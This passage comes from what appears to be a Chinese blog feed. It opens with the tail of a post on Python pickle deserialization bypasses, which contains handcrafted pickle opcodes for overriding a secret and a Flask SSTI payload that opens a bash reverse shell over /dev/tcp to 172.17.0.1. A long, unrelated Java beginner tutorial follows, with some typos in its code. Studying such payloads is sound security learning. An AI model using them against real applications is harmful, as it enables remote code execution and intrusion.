V&#x27;\u0066\u006C\u0061\u0067&#x27;</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">c__main__</span><br><span class="line">secret</span><br><span class="line">(V\u006bey  <span class="comment">#key</span></span><br><span class="line">S<span class="string">&#x27;asd&#x27;</span></span><br><span class="line">db.</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">b&#x27;&#x27;&#x27;capp</span></span><br><span class="line"><span class="string">admin</span></span><br><span class="line"><span class="string">(Vsecr\u0065t</span></span><br><span class="line"><span class="string">I1</span></span><br><span class="line"><span class="string">db0(capp</span></span><br><span class="line"><span class="string">User</span></span><br><span class="line"><span class="string">S&quot;admin&quot;</span></span><br><span class="line"><span class="string">I1</span></span><br><span class="line"><span class="string">o.&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><h4 id="内置模块获取关键字"><a href="#内置模块获取关键字" class="headerlink" title="内置模块获取关键字"></a>内置模块获取关键字</h4><p>对于已导入的模块，我们可以通过<code>sys.modules[&#39;xxx&#39;]</code>来获取该模块，然后通过内置函数dir()来列出模块中的所有属性</p><p><img src="https://bu.dusays.com/2024/05/13/6641a597d2de8.png" alt="image-20240321212228133"></p><p>可以看到模块中的属性是以列表的形式输出，我们可以用 dir 列出 admin 模块的所有属性，我们需要的 secret 属性位于最后的位置，这个时候我们就可以利用函数将这里的 secret 取出来。</p><p>由于pickle不支持列表索引、字典索引，所以我们不能直接获取所需的字符串。在Python中，我们可以通过<code>reversed()</code>函数来将列表逆序，并返回一个迭代对象</p><p><img src="https://bu.dusays.com/2024/05/13/6641a598140f8.png" alt="image-20240321212312902"></p><p>然后我们可以通过<code>next()</code>函数来获取迭代对象的下一个元素，默认从第一个元素开始。最终可以构造如下</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="built_in">next</span>(<span class="built_in">reversed</span>(<span class="built_in">dir</span>(sys.modules[<span class="string">&#x27;admin&#x27;</span>]))))</span><br><span class="line"> </span><br><span class="line"><span class="comment">#secret</span></span><br></pre></td></tr></table></figure><p>reversed 函数将 dir 得到的列表逆序，然后使用 next 取第一个即可，写到 opcode 中就是如下构造</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">opcode=<span class="string">b&#x27;&#x27;&#x27;(((((c__main__</span></span><br><span class="line"><span class="string">admin</span></span><br><span class="line"><span class="string">i__builtin__</span></span><br><span class="line"><span class="string">dir</span></span><br><span class="line"><span class="string">i__builtin__</span></span><br><span class="line"><span class="string">reversed</span></span><br><span class="line"><span class="string">i__builtin__</span></span><br><span class="line"><span class="string">next</span></span><br><span class="line"><span class="string">.&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(pickle.loads(opcode))</span><br><span class="line"> </span><br><span class="line"><span class="comment">#secret</span></span><br><span class="line">   </span><br><span class="line">获取到了secret字符串，下面就容易构造变量覆盖了</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">opcode = <span class="string">b&#x27;&#x27;&#x27;c__main__</span></span><br><span class="line"><span class="string">admin</span></span><br><span class="line"><span class="string">(((((c__main__</span></span><br><span class="line"><span class="string">admin</span></span><br><span class="line"><span class="string">i__builtin__</span></span><br><span class="line"><span class="string">dir</span></span><br><span class="line"><span class="string">i__builtin__</span></span><br><span class="line"><span class="string">reversed</span></span><br><span class="line"><span class="string">i__builtin__</span></span><br><span class="line"><span class="string">next</span></span><br><span class="line"><span class="string">I1             //指定参数、索引</span></span><br><span class="line"><span class="string">db(S&#x27;admin&#x27;</span></span><br><span class="line"><span class="string">I1</span></span><br><span class="line"><span class="string">i__main__</span></span><br><span class="line"><span class="string">User</span></span><br><span class="line"><span class="string">.&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="flask-框架下结合-SSTI-进行-bypass"><a href="#flask-框架下结合-SSTI-进行-bypass" class="headerlink" title="flask 框架下结合 SSTI 进行 bypass"></a>flask 框架下结合 SSTI 进行 bypass</h3><p>简单放一下 payload，大体的思路就是调用 flask.templating 的 render_template_string 来传入 SSTI 的相关 paylaod</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload=<span class="string">&quot;cflask.templating\nrender_template_string\np0\n(S\&quot;&amp;#123;% for x in (().__class__.__base__.__subclasses__()) %&amp;#125;&amp;#123;%if x.__name__ ==&#x27;catch_warnings&#x27;%&amp;#125;&amp;#123;&amp;#123;x.__repr__.im_func.func_globals.linecache.os.system(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/172.17.0.1/12345 0&gt;&amp;1\&quot; &amp;&#x27;)&amp;#125;&amp;#125;&amp;#123;%endif%&amp;#125;&amp;#123;%endfor%&amp;#125;\&quot;\np1\ntp2\nRp3\n.&quot;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> 后端漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java基础</title>
      <link href="/2024/05/13/java%E5%9F%BA%E7%A1%80/"/>
      <url>/2024/05/13/java%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<h1 id="JAVA基础"><a href="#JAVA基础" class="headerlink" title="JAVA基础"></a>JAVA基础</h1><h2 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h2><p>1）.单行注释 &#x2F;&#x2F;</p><p>2）.多行注释</p><p>&#x2F;*</p><p>*&#x2F;</p><p>3）.文档注释   （在生成文档时会保留下）</p><p>&#x2F;**</p><p>*&#x2F;</p><p>第一个java文件</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloWorld</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        System.out.print(<span class="string">&quot;hello world&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;    </span><br></pre></td></tr></table></figure><h2 id="输出语句"><a href="#输出语句" class="headerlink" title="输出语句"></a>输出语句</h2><p>System.out.print</p><p>System.out.println</p><p>System.out.printf</p><p><strong>区别：</strong></p><p>1、print 将它的参数显示在命令窗口，并将输出光标定位在所显示的最后一个字符之后。</p><p>   System.out.print(参数) 参数不能为空.必须有</p><p>2、println 将它的参数显示在命令窗口，并在结尾加上换行符，将输出光标定位在下一行的开始。</p><p>   System.out.println() 可以不写参数</p><p>3、printf 是格式化输出的形式（即可以控制输出的格式）。</p><ul><li><p>%d的意思是一个int值的占位符</p></li><li><p>%f为一个double 或float值的占位符</p></li><li><p>%s为一个string值的占位符</p></li><li><p>%.2f：输出两位小数点</p></li><li><p>%.3f：输出三位小数点</p></li></ul><p>例：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">a</span> &#123;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String args[])</span> &#123;</span><br><span class="line"></span><br><span class="line">            <span class="type">int</span> i=<span class="number">9</span>;</span><br><span class="line"></span><br><span class="line">            <span class="type">double</span> j=<span class="number">10.4</span>;</span><br><span class="line"></span><br><span class="line">            System.out.print(<span class="string">&quot;i,j的值分别为:&quot;</span>+i+<span class="string">&quot;,&quot;</span>+j);</span><br><span class="line"></span><br><span class="line">            System.out.print(<span class="string">&quot;\n&quot;</span>);<span class="comment">//换行</span></span><br><span class="line"></span><br><span class="line">            System.out.println(<span class="string">&quot;i,j的值分别为:&quot;</span>+i+<span class="string">&quot;,&quot;</span>+j);</span><br><span class="line"></span><br><span class="line">            System.out.printf(<span class="string">&quot;i的值为%d,j的值为%f&quot;</span>,i,j);</span><br><span class="line"></span><br><span class="line">            System.out.println();<span class="comment">//换行</span></span><br><span class="line"></span><br><span class="line">            System.out.printf(<span class="string">&quot;i的值为%d,j的值为%.2f&quot;</span>,i,j);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/13/6641a4a96621b.png" alt="image-20240311085719107"></p><h2 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h2><p>1）定义：</p><p>计算机内存中的一块存储空间，是存储数据的基本单元</p><p>2）声明：</p><p>​      数据类型 变量名；</p><p>​      赋值：</p><p>​      变量名&#x3D;值；</p><p>​      使用：</p><p>​      System.out.print(变量名)；</p><p>可以声明时一起赋值</p><p>3）标识符</p><p>由字母，货币符号（英文状态下的），下划线（-），数字组成</p><p>不能以数字开头</p><p>不能与关键字、保留字重名</p><p>不能与字面常量重名（true  false  null）</p><p>命名方法：</p><p>a.帕斯卡法（pascal）每个单词首字母大写</p><p>b.驼峰命名法（camel）首单词首字母小写，后续单词首字母大写</p><h2 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h2><p>java中的变量有严格的数据类型区分（强类型语言）</p><p>java中任意一个值都有其对应的类型的变量。</p><p><img src="https://bu.dusays.com/2024/05/13/6641a4ae94188.png" alt="image-20240304232122039"></p><p>基本数据类型共8种</p><h3 id="整数"><a href="#整数" class="headerlink" title="整数"></a>整数</h3><p><img src="https://bu.dusays.com/2024/05/13/6641a4b740734.png" alt="image-20240304232204722"></p><p>整数默认为int(运算时) 但在具体赋值时会<strong>窄化</strong>成具体类型</p><p>如果为long类型（超过int的极限时），需要在值的后面加“L”（不加就会转换成int）</p><h3 id="小数（浮点型）"><a href="#小数（浮点型）" class="headerlink" title="小数（浮点型）"></a>小数（浮点型）</h3><p><img src="https://bu.dusays.com/2024/05/13/6641a4b319e6f.png" alt="image-20240304233038730"></p><p>浮点型数值采用科学计数法表示</p><p>double为浮点数的默认类型，要切换成float类型时，要在后面的值加“f”</p><h3 id="布尔型"><a href="#布尔型" class="headerlink" title="布尔型"></a>布尔型</h3><p><img src="https://bu.dusays.com/2024/05/13/6641a4aa4f376.png" alt="image-20240304233712045"></p><p>可直接赋值true&#x2F;false</p><p>也可以赋值一个结果为true&#x2F;false的表达式</p><p>boolean不能参与算数运算</p><h3 id="字符"><a href="#字符" class="headerlink" title="字符"></a>字符</h3><p>ascii码：<br>0：48  A：65   a：97</p><p><img src="https://bu.dusays.com/2024/05/13/6641a4aa7eaa4.png" alt="image-20240304234149810"></p><p>赋值方式：</p><p><img src="https://bu.dusays.com/2024/05/13/6641a4af1e208.png" alt="image-20240304234309189"></p><p>转义字符：</p><p><img src="https://bu.dusays.com/2024/05/13/6641a4ac51bbe.png" alt="image-20240304234358568"></p><h3 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h3><p><img src="https://bu.dusays.com/2024/05/13/6641a4a94fd4d.png" alt="image-20240304234553646"></p><p><img src="https://bu.dusays.com/2024/05/13/6641a4aa3ff7b.png" alt="image-20240304234622463"></p><h3 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h3><p><img src="https://bu.dusays.com/2024/05/13/6641a4b630981.png" alt="image-20240304234858505"></p><h3 id="类型转换"><a href="#类型转换" class="headerlink" title="类型转换"></a>类型转换</h3><p>1.自动类型转换</p><blockquote><p>两种类型相互兼容</p><p>目标类型大于原类型</p></blockquote><p>short-&gt;int</p><p>2.强制类型转换</p><blockquote><p>两种类型相互兼容</p><p>目标类型小于原类型</p></blockquote><p>int-&gt;short</p><p><img src="https://bu.dusays.com/2024/05/13/6641a4b41f55c.png" alt="image-20240304235407561"></p><p>强制转换规则：</p><p><img src="https://bu.dusays.com/2024/05/13/6641a4b7baedc.png" alt="image-20240304235613018"></p><p>自动类型提升</p><p><img src="https://bu.dusays.com/2024/05/13/6641a4b5d4e5c.png" alt="image-20240304235718465"></p><h2 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h2><h3 id="算数运算符"><a href="#算数运算符" class="headerlink" title="算数运算符"></a>算数运算符</h3><p><img src="https://bu.dusays.com/2024/05/13/6641a4b5249d5.png" alt="image-20240305001102597"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a=10 b=8</span><br><span class="line"></span><br><span class="line">System.out.print(&quot;a+b=&quot;+a+b);</span><br></pre></td></tr></table></figure><p>此时会输出108 因为字符串拼接会转换成字符串 所以”a+b&#x3D;”+a拼接了（10）</p><p>+（拼接符）b（8）成字符串拼接在一起（108）</p><p>要想输出正确结果，就要加括号，改变其运算顺序</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">System.out.print(&quot;a+b=&quot;+(a+b));</span><br></pre></td></tr></table></figure><p>这样就是18</p><p>同理：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">System.out.print(&quot;a+b=&quot;+a-b)；</span><br></pre></td></tr></table></figure><p>报错 因为字符串不能与整数相减</p><p>要改成</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">System.out.print(&quot;a+b=&quot;+(a-b));</span><br></pre></td></tr></table></figure><p>特殊：</p><p>除数不能为0</p><p>5&#x2F;0  报错-&gt;by zero</p><p>5.0&#x2F;0   报错-&gt;infinity（无限大）</p><p>-5.0&#x2F;0   报错-&gt;-infinity（无限小）</p><p>0.0&#x2F;0   ——&gt;NaN(not a number)</p><p>++–</p><blockquote><p>++在前，先自增再使用自增后的结果</p><p>++在后，先使用自增前的结果再自增</p></blockquote><p>–同理</p><h3 id="赋值运算符"><a href="#赋值运算符" class="headerlink" title="赋值运算符"></a>赋值运算符</h3><p>赋值运算符：等号右边赋值给等号左边</p><p><img src="https://bu.dusays.com/2024/05/13/6641a4aa38851.png" alt="image-20240311083157302"></p><p>例：</p><p><img src="https://bu.dusays.com/2024/05/13/6641a4aa3ff75.png" alt="image-20240311084157980"></p><p><img src="https://bu.dusays.com/2024/05/13/6641a4a9bf250.png" alt="image-20240311084638663"></p><p>因为+是一个二元运算符 会将s1+s2的结果转换为int 此时要强制转换才行</p><p><img src="https://bu.dusays.com/2024/05/13/6641a4a972123.png" alt="image-20240311084349974"></p><p>而+&#x3D;是一个复合赋值运算符 是一元运算符 会将结果窄化，窄化为short 所以不影响</p><h3 id="其他运算符"><a href="#其他运算符" class="headerlink" title="其他运算符"></a>其他运算符</h3><h4 id="关系运算符"><a href="#关系运算符" class="headerlink" title="关系运算符"></a>关系运算符</h4><p>两个操作数进行比较</p><p><img src="https://bu.dusays.com/2024/05/13/6641a4a9e8aca.png" alt="image-20240311085834056"></p><p>比较结果都是布尔值</p><h4 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h4><p><strong>两个boolean</strong>类型的操作数或表达式进行逻辑比较</p><p><img src="https://bu.dusays.com/2024/05/13/6641a4aa77991.png" alt="image-20240311090141834"></p><p>短路与：</p><p><img src="https://bu.dusays.com/2024/05/13/6641a4a9eeb53.png" alt="image-20240311090950018"></p><p>正常 此时b&#x3D;11</p><p><img src="https://bu.dusays.com/2024/05/13/6641a4aa21f28.png" alt="image-20240311091012052"></p><p>短路 此时b&#x3D;10 因为在判断a&gt;9为false后 因为后面式&amp;&amp; 程序认为不用判断后续程序即可得到结果false，所以没有执行b++&#x3D;&#x3D;10 ,所以b&#x3D;10</p><p>但若是前面为a&gt;b 则仍要执行后续代码</p><p>同理有短路或</p><h4 id="三元运算符"><a href="#三元运算符" class="headerlink" title="三元运算符"></a>三元运算符</h4><p>将判断后的结果赋值给变量</p><p><img src="https://bu.dusays.com/2024/05/13/6641a4acb702d.png" alt="image-20240311091830570"></p><h3 id="运算符的优先级"><a href="#运算符的优先级" class="headerlink" title="运算符的优先级"></a>运算符的优先级</h3><ul><li>括号优先</li><li>算数&gt;关系&gt;赋值</li><li>*&#x2F;%&gt;+-</li><li>!&gt;&amp;&amp;&gt;||</li></ul><p><img src="https://bu.dusays.com/2024/05/13/6641a4b170b3d.png" alt="image-20240311092159826"></p><h2 id="控制台输入"><a href="#控制台输入" class="headerlink" title="控制台输入"></a>控制台输入</h2><p><img src="https://bu.dusays.com/2024/05/13/6641a4b011293.png" alt="image-20240311092504993"></p><p>理解：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Scanner;  <span class="comment">//导包</span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        Scanner scanner <span class="comment">/*这里的scanner相当于定义扫描仪*/</span>= <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);  </span><br><span class="line">        <span class="type">double</span> <span class="variable">width</span> <span class="operator">=</span> scanner.nextDouble(); <span class="comment">//小数用nextDouble </span></span><br><span class="line">        <span class="type">double</span> <span class="variable">height</span> <span class="operator">=</span> scanner.nextDouble();  </span><br><span class="line">        <span class="type">double</span> <span class="variable">area</span> <span class="operator">=</span> width * height;  </span><br><span class="line">        <span class="type">double</span> <span class="variable">perimeter</span> <span class="operator">=</span> (width + height) * <span class="number">2</span>;  </span><br><span class="line">        System.out.println(<span class="string">&quot;The area is &quot;</span> + area);  </span><br><span class="line">        System.out.println(<span class="string">&quot;The perimeter is &quot;</span> + perimeter);  </span><br><span class="line">  </span><br><span class="line">        scanner.close();  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Scanner;<span class="comment">//导包</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestS</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span> <span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="type">Scanner</span> <span class="variable">input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);<span class="comment">//所以扫描仪的名字可以自定义（这里的input 上面的scanner）</span></span><br><span class="line">        <span class="comment">//这里可以来一些提示输入</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> input.next();<span class="comment">//next()是接收字符串</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">age</span> <span class="operator">=</span> input.nextInt();<span class="comment">//接收整数用nextInt()</span></span><br><span class="line">        <span class="type">char</span> gender=input.next().charAt(<span class="number">0</span>);<span class="comment">//charAt(0)表示提取接收字符串的第一个字符 截断 所以这里是接收字符</span></span><br><span class="line">        System.out.println(”姓名： “+name);</span><br><span class="line">        System.out.println(”年龄： “+age); </span><br><span class="line">        System.out.println(”性别： “+gender);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="选择结构"><a href="#选择结构" class="headerlink" title="选择结构"></a>选择结构</h2><h3 id="简单if"><a href="#简单if" class="headerlink" title="简单if"></a>简单if</h3><p><img src="https://bu.dusays.com/2024/05/13/6641a4a980f43.png" alt="image-20240313101950939"></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        Scanner.scanner=<span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">        System.out.println(<span class="string">&quot;成绩：&quot;</span>)；</span><br><span class="line">            <span class="type">int</span> a=scanner.nextInt();</span><br><span class="line">        <span class="keyword">if</span>(a&gt;=<span class="number">90</span>)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;周末放假&quot;</span>)；</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/13/6641a4aa2c333.png" alt="image-20240313102859465"></p><h3 id="if-else"><a href="#if-else" class="headerlink" title="if-else"></a>if-else</h3><p><img src="https://bu.dusays.com/2024/05/13/6641a4a98b6f4.png" alt="image-20240313103024331"></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        Scanner scanner=<span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">        System.out.println(<span class="string">&quot;成绩：&quot;</span>)；</span><br><span class="line">            <span class="type">int</span> a=scanner.nextInt();</span><br><span class="line">        <span class="keyword">if</span>(a&gt;=<span class="number">90</span>)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;周末放假&quot;</span>)；</span><br><span class="line">        &#125;eles&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;滚去学习&quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/13/6641a4aa3cd15.png" alt="image-20240313103354178"></p><h3 id="多重if"><a href="#多重if" class="headerlink" title="多重if"></a>多重if</h3><p><img src="https://bu.dusays.com/2024/05/13/6641a4aa2c8b7.png" alt="image-20240313103533397"></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Scannr;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        Scanner scanner=<span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">        System.out.println(钱：);</span><br><span class="line">        <span class="type">int</span> a=scanner.nextInt();</span><br><span class="line">        <span class="keyword">if</span> (a&gt;=<span class="number">500</span>)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;法拉利&quot;</span>)；</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(a&gt;=<span class="number">100</span>)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;保时捷&quot;</span>)；</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(a&gt;=<span class="number">50</span>)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;奔驰&quot;</span>)；</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(a&gt;=<span class="number">10</span>)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;大众&quot;</span>)；</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;五菱宏光，都有能买的车了，你还要什么自行车&quot;</span>)；</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从大到小排或从小到大排</p><p>要连续区间</p><p><img src="https://bu.dusays.com/2024/05/13/6641a4ab325cd.png" alt="image-20240313110232793"></p><h3 id="嵌套if"><a href="#嵌套if" class="headerlink" title="嵌套if"></a>嵌套if</h3><p><img src="https://bu.dusays.com/2024/05/13/6641a4aa5f750.png" alt="image-20240313110347076"></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        Scanner scanner=<span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">        System.out.println(<span class="string">&quot;预赛成绩&quot;</span>)；</span><br><span class="line">        <span class="type">int</span> a=scanner.nextInt();</span><br><span class="line">        <span class="keyword">if</span>(a&lt;=<span class="number">10</span>)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;性别&quot;</span>)；</span><br><span class="line">                <span class="type">char</span> gender=scanner.next().charAt(<span class="number">0</span>);</span><br><span class="line">            <span class="keyword">if</span>(gander==<span class="string">&#x27;男&#x27;</span>)&#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;男子决赛&quot;</span>)；</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;女子决赛&quot;</span>)；</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;很遗憾&quot;</span>)；</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/13/6641a4aab4278.png" alt="image-20240313111734290"></p><h2 id="分支结构"><a href="#分支结构" class="headerlink" title="分支结构"></a>分支结构</h2><p><img src="https://bu.dusays.com/2024/05/13/6641a4aa7993f.png" alt="image-20240313112041530"></p><p><img src="https://bu.dusays.com/2024/05/13/6641a4ab7327f.png" alt="image-20240313112544753"></p><p>只要是Int即可判断</p><p>byte short char 都可以转换成Int</p><p>string本质上是int(hashCode)</p><p>long不行Long不能转成32位的int</p><p>case的值不能相同</p><p>当执行成功一个case会继续向下执行直到遇到break</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        Scanner scanner=<span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">        System.out.println(<span class="string">&quot;银行简写&quot;</span>);</span><br><span class="line">        String bank=scanner.next();</span><br><span class="line">        <span class="keyword">switch</span>(bank)&#123;</span><br><span class="line">                <span class="keyword">case</span><span class="string">&quot;icbc&quot;</span>:</span><br><span class="line">                <span class="keyword">case</span><span class="string">&quot;ICBC&quot;</span>:</span><br><span class="line">                  System.out.println(<span class="string">&quot;工商银行&quot;</span>)；</span><br><span class="line">                  <span class="keyword">break</span>;                 </span><br><span class="line">                <span class="keyword">case</span><span class="string">&quot;bc&quot;</span>:</span><br><span class="line">                  System.out.println(<span class="string">&quot;中国银行&quot;</span>)；</span><br><span class="line">                  <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span><span class="string">&quot;cbc&quot;</span>:</span><br><span class="line">                  System.out.println(<span class="string">&quot;建设银行&quot;</span>)；</span><br><span class="line">                  <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">default</span></span><br><span class="line">                  System.out.println(<span class="string">&quot;输入有误&quot;</span>)；</span><br><span class="line">                  <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;    </span><br></pre></td></tr></table></figure><p>使用toLowerCase()可以把大写转成小写</p><p>switch(bank.toLowerCase())</p><p><img src="https://bu.dusays.com/2024/05/13/6641a4aaa1ea1.png" alt="image-20240313115019616"></p><h2 id="循环结构"><a href="#循环结构" class="headerlink" title="循环结构"></a>循环结构</h2><p>概念：通过某个条件，重复执行一段逻辑代码</p><p><img src="https://bu.dusays.com/2024/05/13/6641a4abb65f9.png" alt="image-20240318083142151"></p><h3 id="while循环"><a href="#while循环" class="headerlink" title="while循环"></a>while循环</h3><p><img src="https://bu.dusays.com/2024/05/13/6641a4ad52e53.png" alt="image-20240318083315614"></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="type">int</span> i=<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span>(i&lt;=<span class="number">100</span>)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;第&quot;</span>+i+<span class="string">&quot;次输出HelloWorld&quot;</span>);</span><br><span class="line">            i++</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;    </span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/13/6641a4b4192e2.png" alt="image-20240318084223134"></p><p>while是先判断后执行</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//求和 1-100总和 奇数和 偶数和</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="type">int</span> sum=<span class="number">0</span>,odd=<span class="number">0</span>,even=<span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> i=<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span>(i&lt;=<span class="number">100</span>)&#123;</span><br><span class="line">            sum=sum+i;</span><br><span class="line">            <span class="keyword">if</span>(i%<span class="number">2</span>==<span 